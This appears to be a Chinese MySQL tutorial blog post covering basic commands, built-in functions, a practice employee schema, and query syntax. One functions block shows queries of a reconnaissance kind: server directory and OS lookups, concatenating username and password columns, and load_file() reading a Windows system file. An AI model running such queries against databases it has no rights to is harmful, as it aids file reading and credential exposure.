<h2 id="三、-Mysql-常用命令"><a href="#三、-Mysql-常用命令" class="headerlink" title="三、 Mysql 常用命令"></a>三、 Mysql 常用命令</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库：</span><br><span class="line"><span class="keyword">show</span> databases；</span><br><span class="line">建库：</span><br><span class="line"><span class="keyword">create</span> database <span class="operator">+</span> 库名;</span><br><span class="line">删库：</span><br><span class="line"><span class="keyword">drop</span> database <span class="operator">+</span> 库名;</span><br><span class="line">进入指定数据库：</span><br><span class="line">use <span class="operator">+</span> 库名；</span><br><span class="line">查看当前数据库中的表：</span><br><span class="line"><span class="keyword">show</span> tables；</span><br><span class="line">查看其他数据库中的表：</span><br><span class="line"><span class="keyword">select</span> tables <span class="keyword">from</span> <span class="operator">+</span> 其它库中的表名;</span><br><span class="line">查看表的结构：</span><br><span class="line"><span class="keyword">desc</span> <span class="operator">+</span> 表名;   </span><br><span class="line">查看创建表的语句：</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> <span class="operator">+</span> 表名;</span><br><span class="line">查列：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">+</span> 表名；</span><br><span class="line">查询当前使用的数据库：</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line">查看数据库版本：</span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line">终止一条语句：\c</span><br><span class="line">退出mysql: \q(ctrl<span class="operator">+</span>c)  quit  exit </span><br></pre></td></tr></table></figure>
<p><strong>导入数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">当希望导入一个 较大 的文件或者是想要批量的执行<span class="keyword">sql</span>语句时，可以使用 mysql 中的 source 命令</span><br><span class="line">使用方法：source <span class="operator">+</span> 文件路径</span><br></pre></td></tr></table></figure>
<h2 id="四、增删改查-CRUD"><a href="#四、增删改查-CRUD" class="headerlink" title="四、增删改查 CRUD"></a>四、增删改查 CRUD</h2><blockquote>
<p><strong>增（Create）<br>检索（Retrieve）<br>修改（Update）<br>删除（Delete）</strong></p>
</blockquote>
<h2 id="五、常用内置函数"><a href="#五、常用内置函数" class="headerlink" title="五、常用内置函数"></a>五、常用内置函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">floor</span>()		#向下取整</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(<span class="string">&#x27;z&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="string">&#x27;z&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(<span class="string">&#x27;1.23&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="string">&#x27;1.23&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">rand()	#返回 <span class="number">0</span><span class="number">-1</span> 之间的随机数</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> rand();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> rand()               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.032002185501160275</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> rand();</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> rand()             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.5766042141025925</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">left</span>(&quot;welcome&quot;,<span class="number">3</span>)	# wel</span><br><span class="line"><span class="keyword">right</span>(&quot;hello&quot;,<span class="number">2</span>)	# lo</span><br><span class="line"><span class="built_in">position</span>(&quot;m&quot; <span class="keyword">in</span> &quot;welcome&quot;)  # <span class="number">6</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 取 <span class="number">0</span><span class="number">-9</span> 之间的随机整数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">10</span>)<span class="operator">+</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"># 截取部分</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="string">&#x27;xxx@qq.com&#x27;</span>,<span class="built_in">position</span>(<span class="string">&#x27;@&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;xxx@qq.com&#x27;</span>)<span class="number">-1</span>);  # xxx</span><br><span class="line"></span><br><span class="line"># 格式输出时间</span><br><span class="line"><span class="keyword">select</span> date_format(now(),<span class="string">&#x27;%Y-%m-%d&#x27;</span>); # <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span>;		# 返回数据库存储目录 D:\phpstudy_pro\Extensions\MySQL5<span class="number">.7</span><span class="number">.26</span>\data\</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span>_compile_os;  # 查看服务器操作系统  Win64</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();  #  root<span class="variable">@localhost</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">current_user</span>();</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">current_user</span>();</span><br><span class="line"></span><br><span class="line">concat(username,&quot;--&quot;,password);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(&quot;c:\\windows\\drivers\\etc\\hosts&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="做练习的数据库，表的结构"><a href="#做练习的数据库，表的结构" class="headerlink" title="做练习的数据库，表的结构"></a>做练习的数据库，表的结构</h1><p>资源如下：<br><a href="https://pan.baidu.com/s/1iA47qGloJYrVriwF43QpMg">https://pan.baidu.com/s/1iA47qGloJYrVriwF43QpMg</a><br>提取码：65yv </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_myworld <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> dept              <span class="operator">|</span>   部门表</span><br><span class="line"><span class="operator">|</span> emp               <span class="operator">|</span>   员工表</span><br><span class="line"><span class="operator">|</span> salgrade          <span class="operator">|</span>   工资等级表</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> dept;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field  <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> DEPTNO <span class="operator">|</span> <span class="type">int</span>(<span class="number">2</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 部门编号</span><br><span class="line"><span class="operator">|</span> DNAME  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">14</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 部门名称</span><br><span class="line"><span class="operator">|</span> LOC    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">13</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 部门位置</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> emp;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field    <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> EMPNO    <span class="operator">|</span> <span class="type">int</span>(<span class="number">4</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 员工编号</span><br><span class="line"><span class="operator">|</span> ENAME    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 员工姓名</span><br><span class="line"><span class="operator">|</span> JOB      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">9</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 工作岗位</span><br><span class="line"><span class="operator">|</span> MGR      <span class="operator">|</span> <span class="type">int</span>(<span class="number">4</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 上级领导编号</span><br><span class="line"><span class="operator">|</span> HIREDATE <span class="operator">|</span> <span class="type">date</span>        <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 入职日期</span><br><span class="line"><span class="operator">|</span> SAL      <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">7</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 月薪</span><br><span class="line"><span class="operator">|</span> COMM     <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">7</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 补助<span class="operator">/</span>津贴</span><br><span class="line"><span class="operator">|</span> DEPTNO   <span class="operator">|</span> <span class="type">int</span>(<span class="number">2</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 部门编号</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> salgrade;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type    <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> GRADE <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 等级</span><br><span class="line"><span class="operator">|</span> LOSAL <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 最低薪资</span><br><span class="line"><span class="operator">|</span> HISAL <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 最高薪资</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h1><h1 id="DQL-数据查询语言"><a href="#DQL-数据查询语言" class="headerlink" title="DQL(数据查询语言)"></a>DQL(数据查询语言)</h1><h3 id="一、简单的查询语句-DQL"><a href="#一、简单的查询语句-DQL" class="headerlink" title="一、简单的查询语句 (DQL)"></a>一、简单的查询语句 (DQL)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法格式：</span><br><span class="line"><span class="keyword">select</span> 字段名<span class="number">1</span>，字段名<span class="number">2</span>，字段名<span class="number">3</span>，......<span class="keyword">from</span> <span class="operator">+</span> 表名；</span><br><span class="line">查询所有字段：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">+</span> 表名;</span><br><span class="line">给查询结果的列重命名：</span><br><span class="line"><span class="keyword">select</span> 字段名 <span class="keyword">as</span> 新名 <span class="keyword">from</span> <span class="operator">+</span> 表名;</span><br><span class="line"><span class="keyword">select</span> 字段名 新名 <span class="keyword">from</span> <span class="operator">+</span> 表名;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span><span class="operator">+</span><span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span><span class="operator">+</span><span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">中文要用引号引起来(最好都使用单引号，由于双引号不通用)</span><br><span class="line"><span class="keyword">as</span> 关键字可省略，用 空格 代替</span><br></pre></td></tr></table></figure>
<h3 id="二、条件查询"><a href="#二、条件查询" class="headerlink" title="二、条件查询"></a>二、条件查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法格式：</span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span>，...... <span class="keyword">from</span> <span class="operator">+</span> 表名 <span class="keyword">where</span> <span class="operator">+</span> 条件;</span><br></pre></td></tr></table></figure>
<h4 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h4><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>=</td>
<td>等于</td>
</tr>
<tr>
<td>&lt;&gt; 或 !=</td>
<td>不等于</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于</td>
</tr>
<tr>
<td>is NULL</td>
<td>为NULL</td>
</tr>
<tr>
<td>and</td>
<td>并且</td>
</tr>
<tr>
<td>or</td>
<td>或者</td>
</tr>
<tr>
<td>in</td>
<td>是否为这几个值</td>
</tr>
<tr>
<td>not</td>
<td>非，与is 和in 结合使用</td>
</tr>
<tr>
<td>like</td>
<td>模糊查询，支持%或下划线匹配</td>
</tr>
<tr>
<td><code>between...and...</code></td>
<td>一个范围，含边界 (前面数字必须小于等于后面的数字)，等价于 <code>&gt;= and &lt;=</code></td>
</tr>
</tbody></table>
<p><strong>between…and…</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">8</span>;</span><br><span class="line"> 等价于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;=</span><span class="number">2</span> <span class="keyword">and</span> id <span class="operator">&lt;=</span><span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">8</span> <span class="keyword">and</span> <span class="number">2</span>;  是无效的</span><br><span class="line">注：between...and...可以用于字符串查询<span class="operator">-</span>左闭右开 </span><br><span class="line">例如：<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">between</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;c&#x27;</span>; 指查看a<span class="operator">~</span>b的信息</span><br></pre></td></tr></table></figure>
<p><strong>is NULL 与 is not NULL</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">NULL</span>与<span class="number">0</span>的区别：</span><br><span class="line">数据库中 <span class="keyword">NULL</span> 不是一个值，代表为空，不能使用 <span class="operator">=</span> 衡量；<span class="number">0</span> 是一个值，并不为空。</span><br><span class="line">注：判断是否为<span class="keyword">NULL</span>时，使用的是 <span class="keyword">is</span> 或者是 <span class="keyword">is</span> <span class="keyword">not</span>,而不是 <span class="operator">=</span> 。</span><br></pre></td></tr></table></figure>
<p><strong>and 与 or</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> 的优先级高于 <span class="keyword">or</span>, 必要时使用()括起来</span><br></pre></td></tr></table></figure>
<p><strong>in 与 not in</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span>(<span class="number">5</span>,<span class="number">8</span>);等价于<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">5</span> <span class="keyword">or</span> id<span class="operator">=</span><span class="number">8</span>;</span><br><span class="line">指查找出 id<span class="operator">=</span><span class="number">5</span> 和 id<span class="operator">=</span><span class="number">8</span> 的用户的密码</span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span>(<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line">指查找出 id不等于<span class="number">5</span> 和 id不等于<span class="number">8</span> 的用户的密码</span><br><span class="line">注：不是 <span class="number">5</span><span class="operator">~</span><span class="number">8</span>，<span class="keyword">in</span>之后不是一个区间 </span><br></pre></td></tr></table></figure>


<p><strong>like</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">两个特殊字符：</span><br><span class="line"><span class="number">1.</span><span class="operator">%</span> 代表任意多个字符</span><br><span class="line"><span class="number">2.</span>_ 代表任意一个字符</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有字母b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;_a%&#x27;</span>;</span><br><span class="line">指查找出用户名中带第二个字母为a的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b&#x27;</span>;</span><br><span class="line">指查找出用户名中带最后一个字母为b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%\_%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有下划线_的用户名</span><br><span class="line">注：特殊字符需要转义</span><br></pre></td></tr></table></figure>

<h3 id="三、数据排序"><a href="#三、数据排序" class="headerlink" title="三、数据排序"></a>三、数据排序</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">关键字：<span class="keyword">order</span> <span class="keyword">by</span> 指通过什么方式排序</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名；</span><br><span class="line">注：默认为升序排列</span><br><span class="line"></span><br><span class="line">指定升序：<span class="keyword">asc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">asc</span>；</span><br><span class="line">指定降序：<span class="keyword">desc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">desc</span>；</span><br><span class="line">双重需求：</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名<span class="number">1</span> <span class="keyword">desc</span>,字段名<span class="number">2</span> <span class="keyword">asc</span>；</span><br><span class="line">指先按照 字段名<span class="number">1</span> 降序排列，如果 字段名<span class="number">1</span> 相同，则按照 字段名<span class="number">2</span> 的升序排列</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">按照这个表中 第二列 (第几个字段) 进行排序(默认升序)</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">执行顺序：</span><br><span class="line"><span class="keyword">select</span>        <span class="number">3</span>号</span><br><span class="line">   字段</span><br><span class="line"><span class="keyword">from</span>          <span class="number">1</span>号</span><br><span class="line">   表名</span><br><span class="line"><span class="keyword">where</span>         <span class="number">2</span>号</span><br><span class="line">   条件</span><br><span class="line"><span class="keyword">order</span> by...;  <span class="number">4</span>号</span><br></pre></td></tr></table></figure>

<h3 id="四、分组函数（多行处理函数，聚合函数）"><a href="#四、分组函数（多行处理函数，聚合函数）" class="headerlink" title="四、分组函数（多行处理函数，聚合函数）"></a>四、分组函数（多行处理函数，聚合函数）</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">所有的分组函数都是对&quot;某一组&quot;数据进行操作的，输入多行，输出一行。</span><br><span class="line">count  计数</span><br><span class="line">sum    求和</span><br><span class="line">avg    求平均值</span><br><span class="line">max    最大值</span><br><span class="line">min    最小值</span><br><span class="line">举例：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

<h3 id="五、单行处理函数"><a href="#五、单行处理函数" class="headerlink" title="五、单行处理函数"></a>五、单行处理函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">输入一行，输出一行</span><br></pre></td></tr></table></figure>
<h4 id="空处理函数"><a href="#空处理函数" class="headerlink" title="空处理函数"></a>空处理函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">当<span class="keyword">NULL</span>参与数学运算(即包括加减乘除)时，需要空处理函数</span><br><span class="line">格式：ifnull(可能为<span class="keyword">NULL</span>的数据，想要当作什么数据)</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(ifnull(salary,<span class="number">0</span>)<span class="operator">*</span><span class="number">12</span>), <span class="keyword">from</span> crew;</span><br><span class="line">求一年的薪水之和，当薪水为<span class="keyword">NULL</span>时，被当作<span class="number">0</span>来处理</span><br></pre></td></tr></table></figure>
<h3 id="六、注意点：count-与-count-具体的某个字段"><a href="#六、注意点：count-与-count-具体的某个字段" class="headerlink" title="六、注意点：count(*) 与 count(具体的某个字段)"></a>六、注意点：count(*) 与 count(具体的某个字段)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">count</span>(<span class="operator">*</span>) :统计总记录条数，而不是统计某个字段中的数据，与字段无关</span><br><span class="line"><span class="built_in">count</span>(具体的某个字段)：统计具体字段中不为<span class="keyword">NULL</span>的总数</span><br></pre></td></tr></table></figure>
<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>字符串数据 sum,avg 为 <span class="number">0</span>，max,min 按字母大小取</span><br><span class="line"><span class="number">2.</span>分组函数会自动忽略 <span class="keyword">NULL</span></span><br><span class="line"><span class="number">3.</span>数学运算 中如果有<span class="keyword">NULL</span>参与，结果为定为<span class="keyword">NULL</span></span><br><span class="line"><span class="number">4.</span>分组函数不能直接出现在 <span class="keyword">where</span> 后面，原因是<span class="keyword">group</span> <span class="keyword">by</span> 是在<span class="keyword">where</span>语句执行结束之后执行的</span><br><span class="line"><span class="number">5.</span>分组函数可组合使用</span><br></pre></td></tr></table></figure>
<h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">示例一：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(ifnull(grade,<span class="number">0</span>)) <span class="keyword">from</span> students;</span><br><span class="line">求成绩之和，当成绩为<span class="keyword">NULL</span>时，被当作<span class="number">0</span>来处理</span><br><span class="line">其实不需要ifnull()函数，因为分组函数会自动忽略<span class="keyword">NULL</span>，直接写</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> students;  即可</span><br><span class="line">分组函数 sum 会自动忽略<span class="keyword">NULL</span>的grade，只计算非<span class="keyword">NULL</span>的成绩和</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">示例二：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">NULL</span>;</span><br><span class="line">没有必要使用 <span class="keyword">where</span> 过滤</span><br></pre></td></tr></table></figure>
